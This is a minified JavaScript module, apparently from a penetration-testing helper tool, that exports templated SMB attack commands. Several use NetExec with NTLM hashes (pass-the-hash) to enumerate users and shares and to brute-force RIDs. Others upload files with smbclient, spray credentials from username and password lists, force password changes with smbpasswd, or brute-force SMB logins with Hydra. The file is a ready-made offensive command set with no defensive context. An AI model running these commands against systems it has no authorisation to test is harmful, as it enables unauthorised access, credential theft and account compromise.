const e=[{title:"Enumerate SMB Users with NetExec (hash)",template:"nxc smb {ip} -u {username} -H {hash} --users",description:"Enumerates SMB users using NetExec (formerly CrackMapExec) with an NTLM hash."},{title:"Enumerate SMB Users with NetExec (password)",template:"nxc smb {ip} -u {username} -p '{password}' --users",description:"Enumerates SMB users using NetExec with a plaintext password."},{title:"Enumerate SMB Shares with NetExec (hash)",template:"nxc smb {ip} -u {username} -H {hash} --shares",description:"Enumerates available SMB shares using NetExec and an NTLM hash."},{title:"Enumerate SMB Shares with NetExec (password)",template:"nxc smb {ip} -u {username} -p '{password}' --shares",description:"Enumerates available SMB shares using NetExec and a plaintext password."},{title:"Extract Usernames from NetExec Output (hash)",template:"nxc smb {ip} -u {username} -H {hash} --users | awk '/^SMB/ && $5 ~ /^[a-zA-Z0-9_.]+$/ { print $5 }' | tee -a username.txt",description:"Parses NetExec output (using hash) to extract usernames and save them to a file."},{title:"Extract Usernames from NetExec Output (password)",template:"nxc smb {ip} -u {username} -p '{password}' --users | awk '/^SMB/ && $5 ~ /^[a-zA-Z0-9_.]+$/ { print $5 }' | tee -a username.txt",description:"Parses NetExec output (using password) to extract usernames and save them to a file."},{title:"RID Bruteforce with NetExec",template:"netexec smb {ip} -u {username} -p '{password}' --users --rid-brute",description:"Performs RID brute-forcing to enumerate more users."},{title:"Access SMB Share with smbclient",template:"smbclient //{ip}/{share} -U {domain}\\{username}%{password}",description:"Connects to an SMB share with valid credentials using smbclient."},{title:"List SMB Shares with smbclient",template:"smbclient -L \\\\{ip}\\ -U {username}",description:"Lists available shares on the target IP using smbclient."},{title:"Upload File to SMB Share with smbclient",template:'smbclient //{ip}/{share} -U {username}%{password} -c "put {file}"',description:"Uploads a file to the target SMB share using smbclient."},{title:"NetExec with Kerberos Authentication",template:"netexec smb {ip} -u {username} -p '{password}' -k",description:"Performs enumeration using Kerberos authentication with NetExec."},{title:"NetExec with Kerberos and User Listing",template:"netexec smb {ip} -u {username} -p '{password}' -k --users",description:"Uses Kerberos authentication to list users on the target domain."},{title:"NetExec SMB: Brute force (continue on success)",template:"netexec smb {ip} -u users.txt -p passwords.txt --continue-on-success",description:"Run NetExec with a username list and password list and not stop trying a username after the first successful password."},{title:"NetExec SMB: Detect STATUS_PASSWORD_MUST_CHANGE",template:`netexec smb {ip} -u {domain}\\\\{username} -p '{password}'

smbpasswd -r {ip} -U "{domain}\\\\{username}"`,description:"First attempts SMB auth with NetExec (may reveal account state such as STATUS_PASSWORD_MUST_CHANGE), then runs smbpasswd -r to change the SMB password interactively."},{title:"NetExec SMB: List password policy",template:"netexec smb {ip} -u {username} -p {password} --pass-pol",description:"Query the domain controller for password policy."},{title:"Hydra SMB Bruteforce (Userlist)",template:"hydra -L {userlist} -P {passwordlist} smb://{ip}",description:"Uses Hydra to brute-force SMB login using a list of usernames and passwords."},{title:"Hydra SMB Bruteforce (Single User)",template:"hydra -l {username} -P {passwordlist} {ip} smb",description:"Hydra brute-force attack on SMB service for a single user."},{title:"Nmap SMB Enumeration Scripts",template:"nmap -p 445 --script=smb-enum-users,smb-enum-shares,smb-enum-domains,smb-os-discovery,smb-security-mode,smb-system-info {ip}",description:"Runs a set of Nmap NSE scripts to gather SMB information from the target."}],s={commands:e};export{e as commands,s as default};
